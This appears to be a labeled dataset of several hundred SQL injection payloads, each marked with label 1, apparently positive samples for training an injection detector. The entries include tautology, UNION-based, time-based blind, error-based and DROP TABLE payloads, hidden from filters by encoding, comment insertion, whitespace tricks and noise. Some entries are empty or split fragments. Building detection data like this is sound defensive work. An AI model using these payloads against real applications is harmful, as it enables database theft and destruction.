"%u0027%u0020AND%u00201=1%u0020--%u0020#gkq26tgl1k0b96z", 1
"%27%09%09OR%09%09%271%27%3C%20%20%3D%20%271", 1
"%u0027/*!*/OR%u00201=1%u0020--%u0020", 1
"admin'/**/OR/**/'1'='1--ew96xfou0n", 1
"1%%32%37%20OR%20IF(subs%74ring(database(%29,%2%301,%201)%3D%27a%27,%%320SLEE%50(%35),%200)%20%2f**/OR/**/'b'='b'--", 1
"%27%20AND%201%3Dconvert(int,@@version)----az76gcaqcuf", 1
"' AND 1=convert(int,@@version)----y2fr4mufs", 1
"test'OR%0d%0a'1'%09= '1'/*%0a*/--/*%0a*/", 1
"1%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3--#6dciucyq75td", 1
"1%29%29%2F%2A%2112345%2A%2FUNION%20SELECT%201%2Cdatabase%28%29%2C3--", 1
"'					AND					1	IN (1) convert(int,@@version)--", 1
"%3B%20Drop%20tabLE%20useRS%3B%20--", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 --#wzjzvw", 1
"%u0027/*!*/UNION%u0%3020SELECT%u00201%2c%32,3----xcq%641q%73ff", 1
"1))%20UNion%20SeLEct%201,DatabAsE(),3--#i8EC45R", 1
"'          UNION          SELECT          1,2,3          /*!*/AND          1%20=	1--", 1
"WAI%54FOR DELAY%20'0:0%3a5'----5ar6j930%68b99l3", 1
"test%u0027%u0020O/*!12345*/R%u0020%u00271%u0027%20=	%u00271%u0027%u0020/*", 1
"%27%20OR%20%271%27%3C%3D%271", 1
"'/**/UNION/**/SELECT/**/1,2,3----ukd6ybkc6ee3oc", 1
"1%27%20UN/*!12345*/IOn%20SELecT%20TaBlE_NaMe,%20NulL,%20NuLL%20FrOM%20iNFoRmaTioN_scHEmA.TABleS%20--", 1
"1)%u0020UNION%u0020SELECT%u00201,database(),3%u0020#%u0020more_noise--", 1
"'/*!12345*/UNION SELECT 1,2,3----5n1ld1pu2x6phg", 1
"1%2527%2520OR%2520IF%28substring%28database%28%29%2C%25201%2C%25201%29%253E%253D%2527a%2527%2C%2520SLEEP%285%29%2C%25200%29%2520--", 1
"%27%20AND%201%3D1%20%20AND%20%27a%27%3D%27a%27--%20", 1
"1'/*!*/AND/**/substring(database(),/**/1,/**/1)/**/	= /**/'s'/**/----5w64cwg", 1
"1%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3 OR (1)--", 1
"1%27AND%250asubstring%28database%28%29%2C%0A1%2C1%29%3D%250d%250a%27s%27--", 1
"1		AND		1%u0020<=%u0020%u00201", 1
"%3B%20SEL/*!12345*/ECT%20pg_sleep%285%29%3B%20--", 1
"' OR '1'='1#97jfp", 1
"' UNION SELECT 1,2,3--#hqt0ai2rwtwg9h", 1
"'			AND			extractvalue(1,concat(0x5c,version()))--#i04m3v2abp0r", 1
"'/**/XOR 1%3d1 -- #ek3%32b2%619", 1
";%20SELECT%20pg_sleep(5);%20%20/*!*/AND%201%3D1----dr6294rn3", 1
"'oR%0D%0AExIStS(SElECt%0D%0A1froMusErs)--", 1
";DROPTABLEusers;%0d%0a--", 1
"'anD1=1", 1
"--/*%0d%0a*/", 1
"1' aND subStriNg(DaTABAse(), 1, 1) = 'S' --", 1
"' Union SEleCT nuLl, NULl, nuLL -- #n3p6V", 1
"%27UN/*!*/ION", 1
"SELECT1,2,3--%0d%0a", 1
"%u0%3027%u002%30%55NION%u0020SE%4cECT%u00201,2,3--#21b%398ou", 1
"'/**/UNION/**/SELECT/**/1,2,3 AND 'a'='a'--", 1
";%20DROP%20TABLE%20users;%20%20/*!*/AND%201%3D1----ffaxvy", 1
"1'/*!*/OR					IF(substring(database(),					1,					1)%09IN (1)  'a',					SLEEP(5),					0)					----oevuu6y0iaau0kh", 1
"%25u0027%25u0020A%2F%2A%2A%2FND%25u00201%3D1%25u0020%20AND%20%27a%27%3D%27a%27--%25u0020", 1
"'     AND     1 =%091     --", 1
"1AND%0a1=1#kva5rr5", 1
"1%2F%2A%21%2A%2FAND%201%3D1 /*!*/AND 1=1", 1
"%27%2F%2A%21%2A%2FAND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--", 1
"'OR/*%0d%0a*/'1'='1%0a", 1
"1'OR/*%0d%0a*/IF(subst%72ing(d%61tabase(),1,1)<='a'%2cS%4cEEP(5),0%29-%2d", 1
"1%29%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3%20--%20random_noise--", 1
";					SeLECt					pg_sleep(5);					--", 1
"' OR EXISTS(SELECT 1 FROM users) AND 'a'>='a'--", 1
"test'OR/%2a%0a*/'1'='%31'%0%64%%30a--/*%0a*/", 1
"1%27 or if(sub%53trinG%28DAt%61BaSe(), 1, 1)='A%27, sLe%65P(5), 0)  -- random_noise----MB7%51OTK2td", 1
"%27%20OR%20%271%27%3D%271%20/*!*/AND%201%3D1--s6l4d9iir0s1", 1
"1)%09%09UNION%09%09SELECT%09%091,database(),3--", 1
"%3B%2509%09%09DR%254fP%09%09%09TABL%2545%2509%09%09users%3B%09%09%09--", 1
"test%27%20O/**/R%20%271%27%3D%271%27%20%2F%2A", 1
"'UNIONSELECT/*%0a*/null,null,null", 1
"/*!*/AND 1=1--", 1
"%27%20OR%201%3C%3D1%20 /*!*/AND 1=1--%20", 1
"wAiTfOr%U0020DElaY%U0020%U00270:0:5%U0027--", 1
"1%2f%2a*/&&/**/(1<=1)%31=1", 1
"test'      OR      '1'%20=	'1'      /*", 1
"1%u0027%U0020OR%u0020if(SUBstRiNg(DatABASE(),%U00201,%u00201)=%U0027A%U0027,%u0020sleeP(5),%U00200)%u0020--#1c97tCfu53", 1
"AdmiN'/**/Or/**/'1'='1", 1
"%27/*!*/U%4eION%20%53EL%45CT%20null,%20null,%20n%75ll%20--%20", 1
"'/**/UN/*!12345*/ION%20SELE%43T/**/1,2,3%2d-", 1
"admin%u0027%u0020OR%u0020%u00271%u0027=%u00271 OR (1)", 1
"'%20%20XOR%20%201	= ConveRt(iNt,@@veRSION)--", 1
"'/*!*/&& 1<=1 -- --sxpzdk", 1
"1'			aNd			SubstRiNG(daTAbase(),			1,			1)				= 			'S'			--#y5iyzmfv32a", 1
";%09%09%0%39SEL%45CT%09%09%09pg%5fsleep(5);%09%09%09-%2d", 1
";/%2a!*/DROPTABLE", 1
"users%3b%0a%2d-", 1
"", 1
"test' XOR '1'<='1' /*", 1
"test'%20OR '1'='1%27 /*", 1
"1'/*!*/AND sUBStRING(daTabASe(), 1, 1) = 's' ----BATGc", 1
"'/*!12345*/UNION SELECT null, null, null --", 1
"%27%20anD%20exTRacTVALue(1,cONcAt(0X5C,VerSIon()))--", 1
"admin%27O%2F%2A%21%2A%2FR%0A%271%27%3D%271%2F%2A%250a%2A%2F", 1
"%27%20UNION%20SELECT%201%2C2%2C3----u4ix8", 1
"%27/*!*/U%4eION%20SELECT null, nu%6cl, null --", 1
"%31%U002%37%u0%3020oR%u0020AScIi%28sUBstRiNg(dATabasE(),%U0020%31,%U00201))%U0020%%33%45%u%300201%300%U0020--", 1
"test'OR'1'%%320=	'1'/*/*%0a*/%20   %2d-    random_%6eois%65", 1
";/%2a*/DrOP/**/ta%42LE/*%2a/UsE%72s;/**/--", 1
";%20S%45LECT%20%70g_sleep(5)%3b%20--", 1
"1%u0020&&%u0020(1=1)1=1 -- random_noise--imeq19", 1
"1))%55nion%0D%%30AseL%45CT", 1
"%31,DATabaSe(),3--%0A", 1
"admin'XOR'1'='1%0d%0a", 1
"%u0027%%750020UN%49%4fN%u0020SEL/*!12345*/ECT%u0020%31,2,3--", 1
"WAITFOR%25u0020DELAY%25u0020%25u00270%3A0%3A5%25u0027 AND 'a'='a'--", 1
"%27UNIONSELECT%250d%250anull%2C%2F%2A%250d%250a%2A%2Fnull%2Cnull--", 1
"1)UNIOn/*%0d%0a*/SeLeCt/*%0a*/1,DaTabasE(),3----u8sp3Bu27nUn5i%0a", 1
"wAiTFOr DELAY '0:0:5'--", 1
"1%u0027%u0020OR%u0020asc%69i(substring(database(),%201,%u0020%31)%29%u0020>%20100%u0020--", 1
"1%27%%320OR%20ascii(subs%74ring(da%74abase(),%%3201,%201))%20%%33E%20100%20%2d-", 1
"'UNIONSELECT/*%0a*/1,2,3--%0a#p6d69zlhl", 1
"%31'orAscII(sUbSTrinG(Dat%61BA%73E%28),1,%31))%0A>", 1
"%3100--/*%0A*/", 1
"1		AND		1%20=%20%31", 1
"%27%20And%201%3DcoNVeRT%28Int%2C%40%40VerSioN%29--", 1
"1%27%2509%2509%2509%2509AND%2509%2509%2509%2509substring%28database%28%29%2C%2509%2509%2509%25091%2C%2509%2509%2509%25091%29%2509%2509%2509%2509%2520%3D%2509%2509%2509%2509%2509%27s%27%2509%2509%2509%2509--%23x6vktx2nt04", 1
"aDMiN%27%20OR%20%271%27%3D%271", 1
"1%u0027%u0020uNiON%u0020SeLECT%U0020tablE_NAMe,%u0020NULL,%u0020nuLL%U0020FrOm%u0020INfOrmAtion_sCheMA.TabLEs%u0020--", 1
"1%25u0027%2F%2A%2112345%2A%2FUNION%25u0020SELECT%25u0020table_name%2C%25u0020null%2C%25u0020null%25u0020FROM%25u0020information_schema.tables%25u0020--", 1
"1%u0027%u0020OR%u0020If(sUbsTrIng(datABAsE(),%U00201,%u00201)%09=/*!12345*/ %U0027a%u0027,%u0020SlEep(5),%u00200)%u0020--", 1
";/**/DROP/**/TABLE/**/users;/**//**/OR/**/'b'='b'--", 1
"1%u0027ANDsubstring(database(),1,1)=/*%0d%0a*/%u0027s%u0027--", 1
"'%09%09%09%09%09OR%09%09%09%09%091%09LIKE/**//**/1%09%09%09%09%09--%09%09%09%09%09--xscpwyqe9tx9", 1
"WAITFO/**/RDELAY%0d%0a'0:0:5'--/*%0a*/", 1
"%3B%2F%2A%2A%2FSELECT%2F%2A%2A%2Fpg_sleep%285%29%3B%2F%2A%2A%2F--", 1
"'OR/*%0d%0a*/'1'='1/*%0a*/ OR (1)", 1
"test%27%20%20%20%20%20%20||%20(1%3D1)%20%20%20%20%20%271%27%20%3D%20%271%27%20%20%20%20%20%20/*", 1
"admin' O%52 '1'%3d'1", 1
"test%27XOR%271%27%3D%271%27%2F%2A%250a%2A%2F%2F%2A", 1
"t%65st%%327%20OR%20%271%27%3%44%27%31%27%20--%20", 1
"%31)) UNION %53%45LECT %31,database(),3--", 1
"%u0027%20AND%u00201>=1%20--%u0020", 1
"'/**/AND%201=%31/**/--/**/#vytp5%641", 1
"%27%20OR%20EXISTS(SEL/*!*/ECT%201%20FROM%20users)--", 1
"%u0027/**/AND/**/extractvalue(1,concat(0x5c,version()))----pcgu0q", 1
"1)%09%09%09%09UNION%09%09%09%09SELECT%09%09%09%091,database(),3 OR 'b'='b'--", 1
"' xoR 1=1 --", 1
"TEST' or '1'LiKe'1' --", 1
"'AND1>=convert(int,@@version)--/*%0a*/", 1
"%27%20U%4eION%20SELECT%201%2C%32%2C3-%2d", 1
"WAITFOR DELAY '0:0:5'----3ujaz7", 1
"1%27/**/AND/**/substring(database(),/**/1,/**/1)/**/%3D/**/%27s%27/**/%20/*!*/AND%201%3D1--", 1
"1%29%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3--%23gw9nz40c", 1
"1%2527%20%2555N%2549ON%20SELECT%20table_name%2C%20nul%256c%252c%20null%20FROM%20%2569nformation_schema.%2574able%2573%20--", 1
";%20DROP%20TABLE%20users;%20%20--%20random_noise--", 1
"test'/**/|| '1'='1' --", 1
"%u0027OREXISTS(SELECT1%0d%0aFROM/*%0a*/users)--%0d%0a", 1
"'/*!*/AND/**/1=convert(int,@@version)/**/OR/**/'b'='b'--", 1
"1%u0027/**/UNION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**/----u68ub327kr8", 1
"test'/**/OR '1'='1'  OR (1)--", 1
"1))%20%20%20%20%20uN/*!12345*/IoN%20%20%20%20%20sELEct%20%20%20%20%201,dAtAbAsE(),3 aND 'A'='a'--", 1
"'AND", 1
"extractvalue(1,concat(0x5c,version()))--", 1
"", 1
"%27%2F%2A%252a%2FAN%2544%201%3D1%20--%20--%25646mu2%25691bcs7h", 1
"'/**/OR/**/1LIKE1/**/ OR (1)--/**/", 1
"1%u0027%20a%6ed%u0020subs%74RiNg(DatabASE(),%u00201,%u00201)%u0020%3d%u0020%u0027s%u0027%20 AND 'a'='a'--", 1
"%31'/**/UNION/**/SEL%45%43T/**/table_%6eame%2c/**/null,/**/null/**/%46ROM/**/informati%6fn_sc%68ema.tables/**/--", 1
"1%U0027%U0020anD%u0020SUbsTrING(dataBASE(),%u00201,%u00201)%U0020=%U0020%u0027S%U0027%U0020--", 1
"'and/*%0a*/ExtractvaLuE(1,coNcAt(0X5C,Version()))--%0a", 1
"admin%27/**/O/**/R/**/%271%27%3D%271", 1
"1%27%2520UNION%20SELECT%20table_name%2C%20null%2C%2520n%2575ll%20FROM%20inf%256fr%256dation%255fschema.%2574a%2562les%20--", 1
"'Or%0a'1'>='1/*%0d%0a*/", 1
"'    AND    1 =%20convert(int,@@version)--", 1
"%27%20OR%201IN%20%281%291%20%20%23%20more_noise--%20", 1
"test'/**/  %20      OR   %20   %20  '1' =%20 '1'%20                   /%2a!*/%41ND     %20   %201 =  1--       %20", 1
"1/**/AND%u00201=1%20%23 more_noi%73e", 1
"1'/**/oR/**/iF(suBsTRiNg(DatabAsE(),/**/1,/**/1)<='a',/**/slEEp(5),/**/0)/**//**/--/**/RandoM_nOise--", 1
"%2527%2520AND%2520extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--", 1
"1%27%20XOR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20--", 1
"'/*!*/Or ExISts(SeLECT 1 FrOM usERs)--#P132Mv", 1
"%3B%2F%2A%2A%2FSELECT%2F%2A%2A%2Fpg_sleep%285%29%3B%2F%2A%2A%2F%2F%2A%2A%2FAND%2F%2A%2A%2F%27a%27%3D%27a%27--", 1
"%3B%20sELect%20Pg_SLEEP%285%29%3B%20--", 1
"1%27%20oR%20ASCiI(SUbstRiNG(DatAbAse(),%201,%201))%20%3e%20100%20--", 1
"'		AND		extractvalue(1,concat(0x5c,version()))--", 1
"%u0027%u0020UNION%u0020SELECT%u00201,2,3/*!*/OR (1)--", 1
"%27%%320UN%49ON%20SELECT%201%2C2%2C3%2%30%%323%20more_noise-%2d", 1
"'AND%0d%0aextractvalue(1,concat(0x5c,version()))/*%0d%0a*/OR'b' =	'b'--#60ax6f78ohll", 1
"", 1
"1' || If(suBSTrInG(DATAbaSE(), 1, 1)='A', sLeEp(5), 0) --", 1
"%27OREXISTS(SELECT1FROMusers)--", 1
"", 1
"' anD extrACTvalUE(1,CONCat(0x5c,VersioN()))--", 1
"1'%20%20%20%20OR%20%20%20%20IF(substring(database(),%20%20%20%201,%20%20%20%201) =%20'a',%20%20%20%20SLEEP(5),%20%20%20%200)%20%20%20%20%20%20%20%20OR%20%20%20%20'b' =%20'b'--", 1
"'/*!12345*/OR%20%20%20EXISTS(SELECT%20%20%201%20%20%20FROM%20%20%20users)%20%20%20OR%20%20%20(1)--", 1
"test%27 || '1'='1'%20/*", 1
"'/*!12345*/ANDextractvalue(1,concat(0x5c,version()))--%0a", 1
"1%2520AND%25201%253D1%23y52yukas", 1
"1%20AND%201%3D1--s5totu1zl0pv", 1
"test'OR/*%0d%0a*/'1'='1'%0a/*%0d%0a", 1
"admin' OR '1'='1 OR 'b'='b'", 1
"1%25u0027%2F%2A%2A%2FUN/*!*/ION%2F%2A%2A%2FSELECT%2F%2A%2A%2Ftable_name%2C%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2F%2A%2A%2FFROM%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F--", 1
"'unIOn/*%0a*/selEct/*%0a*/1,2,3--%0d%0a", 1
"%%750027%u0020or%u%300201=1%%750020--%%750020", 1
";SELECT/*%0d%0a*/pg_sleep(5);", 1
"OR 'b'='b'--", 1
"#hsspdmm", 1
"1/*!*/AND1=1%0d%0a--/*%0a*/random_noise%0a", 1
"admIN'/**/Or/**/'1'='1/**/OR/**/'b'='b'#Jg7YNSrId9xa4a", 1
"test'/**/OR/**/'1'%20=	'1'/**/--/**/", 1
"1'%09%09%09AND%09%09%09substring(database(),%09%09%091,%09%09%091)%09%09%09 =%09%09%09%09's'%09%09%09--", 1
"test%25u0027%25u0020O/*!*/R%25u0020%25u00271%25u0027%3D%25u00271%25u0027%25u0020%2F%2A", 1
"1)/*!*/UNIOn Select 1,DaTAbaSe(),3--", 1
"1' UNI%4fN%20SELECT%20table_n%61me, %6eull%2c nul%6c FROM information_sche%6da.tables --", 1
"1'AND%0d%0asubstring(database(),1,1)='s'--", 1
"1%20AND%201%3D1 /*!*/AND 1=1--6zw92n5slo3tej", 1
"%u0027%20%20%20OR%20%20%20%u00271%u0027%20=%20%u00271", 1
"%27%20AN%44%201%3D1%20--%%320", 1
"%27%20OR%20EXISTS(SELECT%201%20FROM%20users) -- random_noise--", 1
"1' unIoN SELECt tABLE_NAmE, nulL, nuLL fROM INFoRmaTION_ScheMa.Tables  /*!*/aNd 1=1----Z0uaq0FQfNUWu9P", 1
"test%u0027O/*!12345*/R%0a%u00271%u0027=%u00271%u0027/*", 1
"Test'%20oR/**/'1'='1'/**/%2f*", 1
"1%27%20aNd%20SUBSTrINg(dATAbAse(),%201,%201)%20%3d%20%27S%27%20--", 1
"1' && (1=1)substring(database(), 1, 1) = 's' ----mzv1jdw1h92s", 1
"1%27%20aND%20substrINg(DaTAbAsE(),%201,%201)%20%3d%20%27s%27%20--#c8xo5", 1
"%u0027%U0020OR%u0020%u00271%u0027=%U00271", 1
"%27%20OR%20%45XISTS%28SELECT%201%20FR%4fM%2%30%75sers%29%2d-", 1
"TEst' XOR '1'%20=%09%271' %2d%2d", 1
"1'/**/AND/**/substring(database(),/**/1,/**/1)/**/IN(1)/**/'s'/**/--%0a#il4rg0pa2", 1
"test%27%%320OR%%320%%3271%%327%3D%271%27%20--%20", 1
"1' UniON selEct tAblE_naMe, nuLL, nULl FRom INFORMAtIoN_SChEMA.TABlEs  AND 'a'='a'--", 1
"test%27%u0020%4fR%u0020%u00271%u0027=%u00271%u0027%u0020/*", 1
"'/**/&&/**/(1=%31)%31=1/%2a*/--/**/", 1
"1%20AnD%201%253d1", 1
"'/*!12345*/oR '1'='1", 1
"'/**/uNIoN SElEct NUlL, NulL, NULl --", 1
"%2527%2520%2520%2520%2520%2520UNION%2520%2520%2520%2520%2520SELECT%2520%2520%2520%2520%25201%2C2%2C3--", 1
"1'andsuBSTRinG(DAtAbaSe(),1,1)=%0a'S'--%0a--2yitziodz", 1
"1)/*!*/uNION SeLecT 1,DaTABASe(),3 && 'a'='a'--", 1
"'OR%0a1=1--/*%0d%0a*/", 1
"%2527%2509%2509%2509%2509OR%2509%2509%2509%25091%09%253D%25201%2509%2509%2509%2509--%2509%2509%2509%2509", 1
";%09%09DROP%09%09TABLE%09%09users;%09%09--#zdopbkom75cc", 1
"WAITFOR%2520DELAY%2520%25270%3A0%3A5%2527--#e3wkboilcy5b", 1
"1))%u0020UNION%u0020SELECT%u00201,database(),3----3qywpc", 1
"AdMIN%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%3C%3D%271", 1
"test'%20%20%2%30%20%2%30%4fR%20%20%20%20%20'1'	=	'1'%20%20%2%30%2%30%20--%20%20%20%%320%20", 1
"1%27%20OR%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20----gx7949", 1
";/**/DROP/**/TABLE/**/users;/**//**//*!*/AND/**/1=1--", 1
"%27/*!12345*/UNION%20SELECT%201,2,3--", 1
"%27%20UNION%20SELECT%20null%2C%20null%2C%20null%20--%20--bim9ugk", 1
"%27/**/UNION/**/SELECT/**/null,/**/null,/**/null/**/--/**/", 1
"test%27%20O/*!12345*/R%20%271%27%3D%271%27%20%2F%2A", 1
";SELECT/*%0a*/pg_sleep(5);", 1
"--", 1
"%u0027%09AND%091	=%201%09--%09", 1
"1%27%20OR%20IF(substring(database(),%201,%201)LIKE%27a%27,%20SLEEP(5),%200)%20--", 1
"test%u0027%20OR%20%u00271%u0027%20=%u0020%u00271%u0027%20--%20", 1
"' aNd 1=%63ONveR%74(In%74,@@VeRSION)-%2D", 1
"'      OR      EXISTS(SELECT      1      FROM      users)--", 1
"1) %75nion SeLect 1,%44ataba%73E(%29,3--", 1
"admin' || (1=1)'1'IN (1)'1", 1
"1%27%2F%2A%2A%2FOR%2F%2A%2A%2Fascii%28substring%28database%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%29%2F%2A%2A%2F%3E%2F%2A%2A%2F100%2F%2A%2A%2F----k3pwn", 1
";/*!12345*/SELECTpg_sleep(5);%0a--/*%0a*/", 1
"1/**/&&/**/1=1#NB7hutRT1", 1
"1)/**/UNION/**/SELECT/**/1,database(),3----yqd9f85alou0xw1", 1
"1' XOR substring%28datab%61s%65(), 1, 1) = '%73'%20--", 1
";/*!*/SELECT%20pg_sleep(%35)%3b%20-%2d", 1
"%27%20UNION%20SELECT%201%2C2%2C3----u9tcqfq5r", 1
";/**/SelEct/**/Pg_slEEp(5);/**/--", 1
"admin%u0027%09%09%09OR%09%09%09%u00271%u0027/*!*/LIKE%u0020%u0020%u00271", 1
"1)/*%21123%345*/%55NION/**/SELECT/**/1,dat%61%62ase(),3--", 1
"admin%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%09%3D%20%271", 1
"1)/*!12345*/uNIoN%20%20%20%20selEct%20%20%20%201,DatabAse(),3--", 1
"te%2573t%27%20OR%20%27%2531%27%3D%271%27%20%2F%2A", 1
"' || (1=1)1=1 --", 1
"1) UNION SELECT 1,datab%61se(),3----3%73ibh%77g9%78g%38", 1
"1%27%2509%250%2539%25%25309%2509%2509OR%2509%2509%250%2539%2509%2509IF%28substring%28%2564atabase%28%29%2C%2509%2509%250%2539%2509%25091%252c%25%25309%250%2539%2509%2509%25091%29%2520%3D%2520%27%2561%27%2C%25%25309%2509%2509%25%25309%2509%2553LEEP%285%29%2C%2509%2509%2509%2509%2509%2530%29%2509%2509%2509%2509%2509--", 1
"admiN%27%20%20%20%20%20%20%20%20oR%20%20%20%20%20%20%20%20%271%27%20%3D%20%20%271", 1
"%3B%20DROP%20TABLE%20users%3B%20----95y1ad3z0ilxy", 1
"test'/**/OR/**/'1'LIKE'1'/**//* # more_noise", 1
"'					UNION					SELECT					null,					null,					null					--					--hiccui6er", 1
"1)) U%4eIO%4e SELECT 1,database(%29,3-%2d--w3jn2j4zquyzhat", 1
"'O/*!12345*/R%0a'1'='1%0d%0a", 1
"'OR/*%%30a%2a%2f'1'='1/*%0a*/", 1
"test'/*!12345*/OR '1'='1' --", 1
";%09DRop%09TABle%09uSErs;%09%09/*!*/anD%091%09=%091--", 1
"1%09%09%09%09%09anD%09%09%09%09%091%20%20%3D%20%201", 1
"%27/**/or/**/'1'<%3d'1", 1
"admin'/**/OR/**/'1' =	'1", 1
"'%09%09%09UNION%09%09%09SELECT%09%09%09null,%09%09%09null,%09%09%09null%09%09%09--%09%09%09", 1
"'%20A%4e%44%201	=  C%6fN%76ERt(inT,@@vErsIoN) /*!*/AND 1=1--", 1
"%u0027%u0020AND%u00201=1%u0020%u0020AND%u0020%u0027a%u0027=%u0027a%u0027--%u0020", 1
"1'/*!*/UNION SELECT table_name, null, null FROM information_schema.tables  # more_noise--", 1
"%27%20AND%201%3Dconvert%28%69nt,@@versio%6e)%2d-#e50fc4ym", 1
"'%20%20OR%20%20'1'%09LIKE/*!*/ '1", 1
"test%27OR%271%27	%3D%20%271%27--", 1
"%0a", 1
"%27UN/*!*/IONSELECTnull%2C%250anull%2Cnull%2F%2A%250a%2A%2F--", 1
"%31%27%20OR%20ascii%28substring%28databas%65%28%29%%32C%2%301%2C%201%29%%329%2%30%3E%20100%2%30--", 1
"' UNION SELECT n%75ll, %6eull, nul%6c%20 -- ran%64om_nois%65--", 1
"; DROP TABLE users; --#ifrk6", 1
"WAITFOR DELAY '0:0:5'--#lp016", 1
"tEST'/**/Or/**/'1'	=  '1'/**//*/**/AND/**/'a'	=  'a'", 1
"test%u0027/**/OR/**/%u00271%u0027=%u00271%u0027/**//*", 1
"1' && substring(database(), 1, 1) = 's'  OR (1)--", 1
"test%u0027/**/OR/**/%u00271%u0027=%u00271%u0027/**/--/**/#nnxj56tzjy1rq7", 1
"1'/**/OR ascii(substring(database(), 1, 1)) > 100  AND 'a'<='a'--", 1
"'   XOR   1%20=  convert(int,@@version)--", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20----elpfeaypkq", 1
"'%20A/*!*/ND%20extractvalue(1,concat(0x5c,version()))--", 1
"%u0027AND%0d%0a1=1--", 1
"", 1
"' UniON se%4C%45c%54 nulL, Null,%20nUlL --", 1
"'/*!12345*/UNION/**/SELECT/**/1,2,3--", 1
"'/*!12345*/uNIon select NUlL, NUll, nUll --", 1
"1))     UNI%4fN %20  %20SELECT   %20 1,database(),3-%2d", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20%20AND%20%27a%27%3D%27a%27--", 1
"'OR%0d%0a'1'='1%0d%0a", 1
"%u0027%u0020OR%u00201=1%u0020--random_noise--%u0020%0d%0a", 1
"%27%20||%20%31%3D1%2%30--%20", 1
"waiTFoR dElaY '0:0:5'--", 1
"%3B%2520DROP%2520TABLE%2520users%3B%2520%20%23%20more_noise----5nk4uzm6xvt79", 1
"1'/*!*/AND/**/substring(database(),/**/1,/**/1)/**/=/**/'s'/**/ -- random_noise--", 1
";SEL/**/ECTpg_sleep(5);--/*%0a*/", 1
"' OR 1=1  OR 'b'='b'--", 1
"%u002%37%%750020AND%u00201%3d1%u0020--%u002%30", 1
"1%20AND%201LIKE1%20AND%20%27a%27%3D%27a%27", 1
"'					AND					1%09=  convert(int,@@version)--", 1
"wAItfOR%20de%4cAY '0:0:5%27 AND 'a'='a'--", 1
"1%2%37%2F%2A%2A%2%46AND%2F%2A%2A%2Fs%75bstring%28data%62ase%28%29%2C%2F%2A%2A%2%461%%32C%%32F%2A%2A%2F1%29%2F%2A%2A%2F%3D%2F%2A%2A%2F%27%73%%327%2%46%2A%2A%2F-%2d", 1
"' Or 1=1 --", 1
"%27%20Xor%20%271%27%3D%271", 1
"1%20%20and%20%201%20%20%3d%091#4DHk5", 1
"1)) UNIon sELECt 1,DaTAbasE(),3--", 1
"; dROP %54aBle use%72s; -%2D#M01IEb%624ob5e", 1
"1))%20UNION%20SELECT%201,database(),3----2i5i1jdpi", 1
"%27%20%26%26%201%3D1%20%20%7C%7C%20%27b%27%3D%27b%27--%20%23h8i9nybui", 1
"test'%20OR%20%271'>='1' --", 1
"1)/**/Union sELECt 1,DATAbasE(),3--", 1
"%u0027%u0020uniON%u0020seLECt%u0020nuLL,%u0020NulL,%u0020nUlL%u0020 || (1=1)'b'='b'--%u0020", 1
"%27%20AND%20ex%74ra%63tvalue(1,concat(0x5c,%76ersio%6e()))--", 1
"1)unioN/*%0d%0a*/SeLeCt1,datABAsE(),3--%0D%0a", 1
"%27%2520AND%20extractval%2575e%25281%2Cconcat%280x5c%2C%2576ersio%256e%28%29%29%29 OR (1)--", 1
"%u0027%u0020OR%u00201>=1%u0020--%u0020#crhtjm", 1
"WAITFOR%20DELAY%20%270:0:5%27--#2gwru", 1
"%u0027%u0020UNION%u0020SELECT%u00201,2,3 AND 'a'='a'--", 1
"test' OR '1'='1' /* OR (1)#n33ystnumtbck", 1
"test%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0027%u0020 OR (1)--%u0020#15c09m82h", 1
"test%27OR%271%27%3D%271%27/*%0d%0a*//*", 1
"' XOR 1IN (1)1  XOR 'a'='a'-- #j447ox8r8fxtn3b", 1
"1)/*!12345*/UNION				SELECT				1,database(),3--", 1
"' anD eXTrAcTVaLuE(1,concAT(0x5C,VeRsion()))--", 1
"'          AND          extractvalue(1,concat(0x5c,version()))--", 1
"1)UNIONSELECT1,database(),3--/*%0d%0a*/", 1
"1'    aNd    s%75bsTRiNg(DAtABaSE(),    %31,    1)    %3d    '%73%27        #    MOre_noISE-%2d", 1
"1%27%2F%2A%2A%2FAND%2F%2A%2A%2F%2573ubstring%28database%2528%2529%252c%2F%2A%2A%2F1%2C%2F%2A%2A%252f1%2529%2F%2A%2A%2F%253d%2F%2A%2A%2F%27s%27%2F%2A%2A%2F--", 1
"%27%2520OR%201%3D1%2520--%20", 1
"TEst%27%20or%20%271%27%3D%271%27%20--%20", 1
"%27%2520%2520%2520or%2520%2520%25201%09LIKE%201%2520%2520%2520--%2520%2520%2520", 1
"%U0027%U0020UnIOn%u0020sELect%U00201,2,3--", 1
"1)/**/UNIOn/**/SElect/**/1,DaTABASe(),3--", 1
"; SELECT pg_sleep%285%29%3b  -- r%61ndom_%6eoise--", 1
"1)%u0020UNION%u00%320SELE%43T%u00201,%64atab%61se%28),3--", 1
"%27%20OR%20%271%27%3E%3D%271", 1
"'O/*!12345*/R%31=1/%2a%0d%0a*/----dwe%31a4elash", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables --#8v8jh", 1
"' OR EXISTS(SELECT 1 FROM users) -- random_noise--#4i3e3iacey4h", 1
"%27%20AnD%201%3DconVeRt%28INT%2C%40%40VersiOn%29----GgbrLnKpyS", 1
"1)UN%49ONSELECT/*%%30a*%2f1,database()%2c3--/*%0%64%0a*/", 1
"WAITFOR DELAY '0:0:5'--#s3t1y9uilrt", 1
"test'OR%0a%27%31'='1'/*", 1
"", 1
"%27%20OR%20EXISTS%28SELECT%201%20FROM%20users%29 OR (1)----bpbv5mlux", 1
